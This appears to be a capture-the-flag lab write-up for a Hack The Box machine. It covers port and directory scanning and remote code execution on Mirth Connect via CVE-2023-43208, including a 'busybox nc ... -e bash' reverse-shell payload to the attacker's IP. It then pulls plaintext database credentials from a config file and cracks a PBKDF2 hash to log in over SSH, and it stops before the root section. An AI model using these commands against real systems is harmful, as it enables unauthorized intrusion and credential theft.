## Initial Port Scanning

### Ports

``` python
# Nmap 7.95 scan initiated Sat Feb 21 14:05:26 2026 as: /usr/lib/nmap/nmap --privileged -p- -Pn -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt 10.129.3.94
Warning: 10.129.3.94 giving up on port because retransmission cap hit (5).
Nmap scan report for 10.129.3.94
Host is up (0.18s latency).
Not shown: 65181 closed tcp ports (reset), 350 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
6661/tcp open  unknown
```

### sCV

``` python
# Nmap 7.95 scan initiated Sat Feb 21 14:06:46 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -sC -v -oN nmap_sVsC.txt 10.129.3.94
Increasing send delay for 10.129.3.94 from 0 to 5 due to 35 out of 115 dropped probes since last increase.
Nmap scan report for 10.129.3.94
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp  open  http     Jetty
|_http-title: Mirth Connect Administrator
|_http-favicon: Unknown favicon MD5: 62BE2608829EE4917ACB671EF40D5688
| http-methods:
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
443/tcp open  ssl/http Jetty
| http-methods:
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mirth-connect
| Issuer: commonName=Mirth Connect Certificate Authority
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-19T12:50:05
| Not valid after:  2075-09-19T12:50:05
| MD5:   c251:9050:6882:4177:9dbc:c609:d325:dd54
|_SHA-1: 3f2b:a7d8:5c81:9ecf:6e15:cb6a:fdc6:df02:8d9b:1179
|_http-title: Mirth Connect Administrator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Findings:

- SSH (OpenSSH 9.2p1) on port 22
- HTTP (Jetty)
- HTTPS (Jetty)
## DNS Configuration

``` python
echo "10.129.1.109 interpreter.htb" | sudo tee -a /etc/hosts
```

**Terminal Configuration**

``` python
target=10.129.1.109
domain='interpreter.htb'
```

#### HTTP

![http](Media/http.png)

HTTPS

![https](Media/https.png)

### Directory Enumeration

``` python
gobuster dir --wordlist=/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$domain -o Output_Gobuster.txt       
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://interpreter.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 302) [Size: 0] [--> http://interpreter.htb/js/]
/images               (Status: 302) [Size: 0] [--> http://interpreter.htb/images/]
/css                  (Status: 302) [Size: 0] [--> http://interpreter.htb/css/]
/webadmin             (Status: 302) [Size: 0] [--> http://interpreter.htb/webadmin/]
/installers           (Status: 302) [Size: 0] [--> http://interpreter.htb/installers/]
```

``` python
gobuster dir --wordlist=/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u https://$domain -o Output_Gobuster_ssl.txt -k
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://interpreter.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 302) [Size: 0] [--> https://interpreter.htb/images/]
/js                   (Status: 302) [Size: 0] [--> https://interpreter.htb/js/]
/css                  (Status: 302) [Size: 0] [--> https://interpreter.htb/css/]
/api                  (Status: 302) [Size: 0] [--> https://interpreter.htb/api/]
/webadmin             (Status: 302) [Size: 0] [--> https://interpreter.htb/webadmin/]
/installers           (Status: 302) [Size: 0] [--> https://interpreter.htb/installers/]
```

- https://10.129.1.109/api/

![version](Media/version.png)

**Mirth Connect version 4.4.0**
## Exploitation

[# RCE in Mirth Connect — pt. I. (CVE-2023–37679)](https://vsociety.medium.com/rce-in-mirth-connect-pt-i-cve-2023-37679-2452b864c166)


[Writeup for CVE-2023-43208: NextGen Mirth Connect Pre-Auth RCE](https://horizon3.ai/attack-research/disclosures/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/)

``` python
git clone https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc.git
```

or

``` python
git clone https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT.git
```

### CVE-2023-43208-mirth-connect-rce-poc

``` python
python3 CVE-2023-43208.py -u https://$domain -c "busybox nc 10.10.14.30 443 -e bash"
The target appears to have executed the payload.
```

#### Penelope 443

``` python
python3 /mnt/c/Users/cesar/HTB/penelope/penelope.py -p 443
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from interpreter~10.129.1.109-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/hyperc/.penelope/sessions/interpreter~10.129.1.109-Linux-x86_64/2026_02_21-16_56_25-611.log 📜
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
mirth@interpreter:/usr/local/mirthconnect$
```

### CVE-2023-43208-EXPLOIT

If you have any conflicts, change your file to look like this:

``` python
alive_progress==3.1.4
packaging>=20.9,<21.0
pwncat-cs==0.5.4
requests==2.31.0
rich==10.16.2
```

``` python
python3 CVE-2023-43208.py -u https://interpreter.htb -lh 10.10.14.30 -lp 4444
```

## Initial Access

``` python
mirth@interpreter:/usr/local/mirthconnect/conf$ cat /usr/local/mirthconnect/conf/mirth.properties
# Mirth Connect configuration file

# directories
dir.appdata = /var/lib/mirthconnect
dir.tempdata = ${dir.appdata}/temp

# ports
http.port = 80
https.port = 443

# password requirements
password.minlength = 0
password.minupper = 0
password.minlower = 0
password.minnumeric = 0
password.minspecial = 0
password.retrylimit = 0
password.lockoutperiod = 0
password.expiration = 0
password.graceperiod = 0
password.reuseperiod = 0
password.reuselimit = 0

# Only used for migration purposes, do not modify
version = 4.4.0

# keystore
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS

# server
http.contextpath = /
server.url =

http.host = 0.0.0.0
https.host = 0.0.0.0

https.client.protocols = TLSv1.3,TLSv1.2
https.server.protocols = TLSv1.3,TLSv1.2,SSLv2Hello
https.ciphersuites = TLS_CHACHA20_POLY1305_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_AES_256_GCM_SHA384,TLS_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_DSS_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_DSS_WITH_AES_128_GCM_SHA256,TLS_EMPTY_RENEGOTIATION_INFO_SCSV
https.ephemeraldhkeysize = 2048

# If set to true, the Connect REST API will require all incoming requests to contain an "X-Requested-With" header.
# This protects against Cross-Site Request Forgery (CSRF) security vulnerabilities.
server.api.require-requested-with = true

# CORS headers
server.api.accesscontrolalloworigin = *
server.api.accesscontrolallowcredentials = false
server.api.accesscontrolallowmethods = GET, POST, DELETE, PUT
server.api.accesscontrolallowheaders = Content-Type
server.api.accesscontrolexposeheaders =
server.api.accesscontrolmaxage =

# Determines whether or not channels are deployed on server startup.
server.startupdeploy = true

# Determines whether libraries in the custom-lib directory will be included on the server classpath.
# To reduce potential classpath conflicts you should create Resources and use them on specific channels/connectors instead, and then set this value to false.
server.includecustomlib = true

# administrator
administrator.maxheapsize = 512m

# properties file that will store the configuration map and be loaded during server startup
configurationmap.path = ${dir.appdata}/configuration.properties

# The language version for the Rhino JavaScript engine (supported values: 1.0, 1.1, ..., 1.8, es6).
rhino.languageversion = es6

# options: derby, mysql, postgres, oracle, sqlserver
database = mysql

# examples:
#   Derby                       jdbc:derby:${dir.appdata}/mirthdb;create=true
#   PostgreSQL                  jdbc:postgresql://localhost:5432/mirthdb
#   MySQL                       jdbc:mysql://localhost:3306/mirthdb
#   Oracle                      jdbc:oracle:thin:@localhost:1521:DB
#   SQL Server/Sybase (jTDS)    jdbc:jtds:sqlserver://localhost:1433/mirthdb
#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb
#   If you are using the Microsoft SQL Server driver, please also specify database.driver below
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod

# If using a custom or non-default driver, specify it here.
# example:
# Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver
# (Note: the jTDS driver is used by default for sqlserver)
database.driver = org.mariadb.jdbc.Driver

# Maximum number of connections allowed for the main read/write connection pool
database.max-connections = 20
# Maximum number of connections allowed for the read-only connection pool
database-readonly.max-connections = 20

# database credentials
database.username = mirthdb
database.password = MirthPass123!

#On startup, Maximum number of retries to establish database connections in case of failure
database.connection.maxretry = 2

#On startup, Maximum wait time in milliseconds for retry to establish database connections in case of failure
database.connection.retrywaitinmilliseconds = 10000

# If true, various read-only statements are separated into their own connection pool.
# By default the read-only pool will use the same connection information as the master pool,
# but you can change this with the "database-readonly" options. For example, to point the
# read-only pool to a different JDBC URL:
#
# database-readonly.url = jdbc:...
#
database.enable-read-write-split = true
```

### MariaDB

``` python
mirth@interpreter:/usr/local/mirthconnect/conf$ mysql -u mirthdb -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 38
Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mc_bdd_prod        |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use mc_bdd_prod;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mc_bdd_prod]> show tables;
+-----------------------+
| Tables_in_mc_bdd_prod |
+-----------------------+
| ALERT                 |
| CHANNEL               |
| CHANNEL_GROUP         |
| CODE_TEMPLATE         |
| CODE_TEMPLATE_LIBRARY |
| CONFIGURATION         |
| DEBUGGER_USAGE        |
| D_CHANNELS            |
| D_M1                  |
| D_MA1                 |
| D_MC1                 |
| D_MCM1                |
| D_MM1                 |
| D_MS1                 |
| D_MSQ1                |
| EVENT                 |
| PERSON                |
| PERSON_PASSWORD       |
| PERSON_PREFERENCE     |
| SCHEMA_INFO           |
| SCRIPT                |
+-----------------------+
21 rows in set (0.000 sec)

MariaDB [mc_bdd_prod]> select * from PERSON_PASSWORD
    -> ;
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
1 row in set (0.000 sec)

MariaDB [mc_bdd_prod]>
```

### Identifying hash

``` python
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | wc -c
40
```

SHA256 -> 32 bytes

but 40 bytes..

that usually means:

> 8 bytes salt + 32 bytes hash

Confirmation:

``` python
python3 - << 'EOF'  
import base64  
data = base64.b64decode("u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==")  
  
print("Total bytes:", len(data))  
print("Salt bytes:", len(data[:8]))  
print("Hash bytes:", len(data[8:]))  
EOF
```

PBKDF2-HMAC-SHA256

``` python
python3 -c " import base64 data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==') salt = base64.b64encode(data[:8]).decode() hash_ = base64.b64encode(data[8:]).decode() print(f'sha256:600000:{salt}:{hash_}') "
```

### Hashcat

``` python
☠  hyperc /mnt/c/Users/cesar/HTB/Machines/Interpreter ➜  hashcat -m 10900 hash_final /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2759/5518 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 516 MB (6286 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD...Ld8Ps=
Time.Started.....: Sat Feb 21 18:05:42 2026 (23 secs)
Time.Estimated...: Mon Feb 23 01:27:07 2026 (1 day, 7 hours)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      127 H/s (14.60ms) @ Accel:70 Loops:1000 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 2240/14344385 (0.02%)
Rejected.........: 0/2240 (0.00%)
Restore.Point....: 2240/14344385 (0.02%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:354000-355000
Candidate.Engine.: Device Generator
Candidates.#01...: cedric -> hottie101
Hardware.Mon.#01.: Util: 83%

sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD...Ld8Ps=
Time.Started.....: Sat Feb 21 18:05:42 2026 (1 min, 21 secs)
Time.Estimated...: Sat Feb 21 18:07:03 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      125 H/s (13.16ms) @ Accel:70 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10080/14344385 (0.07%)
Rejected.........: 0/10080 (0.00%)
Restore.Point....: 8960/14344385 (0.06%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:599000-599999
Candidate.Engine.: Device Generator
Candidates.#01...: 010106 -> clarke
Hardware.Mon.#01.: Util: 84%

Started: Sat Feb 21 18:05:40 2026
Stopped: Sat Feb 21 18:07:04 2026
```

Creds:

``` python
:snowflake1

mirth@interpreter:/usr/local/mirthconnect/conf$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
sedric:x:1000:1000:sedric,,,:/home/sedric:/bin/bash

```

## Privilege Escalation to User sedric

### System Enumeration

``` python
mirth@interpreter:/usr/local/mirthconnect/conf$ ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Aug  7  2025 .
drwxr-xr-x 19 root   root   4096 Feb 16 15:42 ..
drwx------  3 sedric sedric 4096 Feb 12 08:46 sedric

mirth@interpreter:/usr/local/mirthconnect/conf$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
sedric:x:1000:1000:sedric,,,:/home/sedric:/bin/bash
```

### SSH

``` python
ssh sedric@10.129.1.109
The authenticity of host '10.129.1.109 (10.129.1.109)' can't be established.
ED25519 key fingerprint is: SHA256:Oz7Fk6YvrB8/5uSyuoY+mqLefkwpPaepkXAppxIX0xk
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.1.109' (ED25519) to the list of known hosts.
sedric@10.129.1.109's password: snowflake1
Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb 21 18:11:59 2026 from 10.10.14.30
sedric@interpreter:~$
```

## Privilege Escalation to Root


